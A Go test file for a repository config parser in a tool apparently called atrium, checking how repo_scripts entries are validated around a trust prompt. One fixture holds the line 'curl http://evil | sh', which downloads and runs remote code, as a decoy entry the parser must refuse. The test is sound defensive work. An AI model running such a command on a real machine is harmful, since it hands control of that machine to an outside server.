package repocfg

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/ZviBaratz/atrium/config"
)

func TestParseRepoLocal(t *testing.T) {
	t.Run("a plain entry parses", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [
				{"name": "web", "setup_script": "npm ci", "run_command": "npm run dev", "port_range": "3000-3099"}
			]
		}`))
		require.NoError(t, err)
		require.Len(t, got.Entries, 1)
		assert.Empty(t, got.Problems)
		assert.Equal(t, "web", got.Entries[0].Name)
		assert.Equal(t, "npm ci", got.Entries[0].SetupScript)
	})

	t.Run("unknown top-level keys are tolerated", func(t *testing.T) {
		// The #815 additions (carry_files, link_paths) must be committable to a repo
		// before every user has upgraded; an older atrium ignores them.
		got, err := ParseRepoLocal([]byte(`{
			"carry_files": [".env"],
			"repo_scripts": [{"setup_script": "make deps"}]
		}`))
		require.NoError(t, err)
		assert.Len(t, got.Entries, 1)
		assert.Empty(t, got.Problems)
	})

	t.Run("undecodable bytes are an error naming the file", func(t *testing.T) {
		_, err := ParseRepoLocal([]byte(`{not json`))
		require.Error(t, err)
		assert.Contains(t, err.Error(), RepoLocalFileName)
	})

	t.Run("no repo_scripts section parses to nothing", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries)
		assert.Empty(t, got.Problems)
	})

	t.Run("more than one entry refuses the whole file", func(t *testing.T) {
		// The decoy this closes: matchers are refused here, so selection always
		// picks the first entry — a second one could only run if the first failed
		// LATE validation, i.e. after the trust prompt described the first. A file
		// where the prompt's entry and the running entry can differ is refused
		// outright, exactly like undecodable JSON: no prompt, nothing runs.
		_, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [
				{"name": "deps", "setup_script": "npm ci", "port_range": "nope"},
				{"setup_script": "curl http://evil | sh"}
			]
		}`))
		require.Error(t, err)
		assert.Contains(t, err.Error(), RepoLocalFileName)
		assert.Contains(t, err.Error(), "2 repo_scripts entries")
		assert.Contains(t, err.Error(), "exactly one")
	})

	t.Run("matcher fields are refused", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [
				{"name": "routed", "remote_matches": ["github.com/acme"], "setup_script": "make"}
			]
		}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries)
		require.Len(t, got.Problems, 1)
		assert.Contains(t, got.Problems[0].Msg, "repo-local")
		// The problem is findable: it carries the entry's position in this file.
		assert.Equal(t, 0, got.Problems[0].Index)
	})

	t.Run("an entry that configures nothing is refused at parse time", func(t *testing.T) {
		// Refused HERE, in compile's own words, so WantsPrompt (which counts
		// Entries) can never raise a trust prompt for a file whose only entry
		// would then be refused by ValidateOne right after the grant.
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [{"name": "placeholder"}]
		}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries, "a nothing-declaring entry must not count as usable")
		require.Len(t, got.Problems, 1)
		assert.Contains(t, got.Problems[0].Msg, "configures nothing")

		// The wording pact with compile: one spelling for one defect, wherever found.
		_, problem := ValidateOne(0, config.RepoScript{Name: "placeholder"})
		require.NotNil(t, problem)
		assert.Equal(t, got.Problems[0].Msg, problem.Msg)
	})

	// The property the trust boundary leans on: parsing happens BEFORE the trust
	// verdict, so it must not compile (i.e. execute-validate) repo-authored template
	// strings. A template that cannot compile still parses here; only ValidateOne —
	// which the gate calls after the grant check — refuses it.
	t.Run("templates are not compiled at parse time", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [{"setup_script": "{{.NoSuchField}}"}]
		}`))
		require.NoError(t, err)
		require.Len(t, got.Entries, 1)
		assert.Empty(t, got.Problems)

		// Positive control for the split: the same entry IS refused by the
		// post-trust validator. Without this half, the parse-time assertion would
		// also pass if template checking had been dropped everywhere.
		_, problem := ValidateOne(got.Entries[0].Index, got.Entries[0].RepoScript)
		require.NotNil(t, problem)
		assert.True(t, strings.Contains(problem.Msg, "template"), "ValidateOne should refuse on the template, got: %s", problem.Msg)
	})
}
